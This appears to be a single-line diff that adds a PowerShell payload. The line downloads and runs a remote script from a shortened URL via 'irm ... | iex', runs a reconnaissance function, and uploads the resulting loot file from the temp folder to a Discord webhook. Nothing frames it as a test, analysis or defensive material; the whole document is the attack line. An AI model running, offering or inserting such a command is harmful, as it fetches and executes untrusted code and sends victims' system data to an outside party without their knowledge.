@@ -1,0 +1,1 @@
+irm "t.ly/0sVZc"|iex;Get-Recon;Upload-Discord -webhookUrl 'YOUR WEBHOOK HERE' -file "$env:TEMP\CaliLoot.txt" | Out-Null
